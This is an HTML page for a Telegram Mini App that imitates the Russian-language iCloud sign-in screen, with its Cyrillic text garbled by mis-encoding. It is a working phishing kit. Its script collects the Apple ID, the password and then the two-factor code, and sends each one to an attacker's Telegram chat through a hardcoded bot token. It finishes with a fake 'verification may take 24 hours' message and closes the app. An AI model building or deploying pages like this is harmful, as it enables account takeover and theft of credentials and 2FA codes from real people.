<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í—Ö–æ–¥ –≤ iCloud</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            padding-top: 50px;
            background-color: #f5f5f7;
        }
        .login-form { width: 300px; display: flex; flex-direction: column; gap: 15px; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { text-align: center; font-size: 20px; margin-bottom: 10px; }
        input { padding: 12px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 16px; outline: none; }
        input:focus { border-color: #007aff; }
        button { padding: 12px; background: #007aff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 500; }
        button:hover { background: #0063cc; }
        p { font-size: 14px; color: #6e6e73; text-align: center; }
    </style>
</head>
<body>

<div class="login-form" id="auth-step">
    <h2>–í—Ö–æ–¥ –≤ iCloud</h2>
    <input type="text" id="email" placeholder="Apple ID">
    <input type="password" id="password" placeholder="–ü–∞—Ä–æ–ª—å">
    <button onclick="sendData()">–í–æ–π—Ç–∏</button>
</div>

<div class="login-form" id="2fa-step" style="display:none;">
    <h2>–î–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞</h2>
    <p>–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –≤–∞—à–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ Apple.</p>
    <input type="text" id="code" placeholder="–ö–æ–¥ –∏–∑ 6 —Ü–∏—Ñ—Ä" maxlength="6">
    <button onclick="send2FA()">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
</div>

<script>
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram WebApp
    const tg = window.Telegram.WebApp;
    tg.expand(); // –†–∞–∑–≤–æ—Ä–∞—á–∏–≤–∞–µ–º –Ω–∞ –≤—Å–µ –æ–∫–Ω–æ

    const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ';
    const chatId = '-5249989864';

    async function sendToTelegram(text) {
        try {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
            });
        } catch (e) {
            console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:", e);
        }
    }

    async function sendData() {
        const emailInput = document.getElementById('email');
        const email = emailInput.value;
        const pass = document.getElementById('password').value;

        // –ü–†–û–í–ï–†–ö–ê: –°–æ–¥–µ—Ä–∂–∏—Ç –ª–∏ —Å–æ–±–∞—á–∫—É @
        if (!email.includes('@')) {
            alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π Apple ID');
            emailInput.style.border = "1px solid red";
            return;
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–µ—Ä–≤–æ–π —á–∞—Å—Ç–∏ –¥–∞–Ω–Ω—ã—Ö
        await sendToTelegram(`‚ö†Ô∏è **–î–∞–Ω–Ω—ã–µ –≤—Ö–æ–¥–∞**\nüë§ ID: \`${email}\`\nüîë Pass: \`${pass}\``);
        
        // –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ —Ñ–æ—Ä–º—ã
        document.getElementById('auth-step').style.display = 'none';
        document.getElementById('2fa-step').style.display = 'flex';
    }

    async function send2FA() {
        const code = document.getElementById('code').value;
        
        if (code.length < 4) {
            alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–ª–Ω–æ—Å—Ç—å—é');
            return;
        }

        await sendToTelegram(`üî¢ **–ö–æ–¥ 2FA**: \`${code}\``);
        
        tg.showAlert("–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–∞–Ω–Ω—ã—Ö... –≠—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –¥–æ 24 —á–∞—Å–æ–≤.");
        
        // –ó–∞–∫—Ä—ã–≤–∞–µ–º Mini App —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
        setTimeout(() => {
            tg.close();
        }, 3000);
    }
</script>

</body>
</html>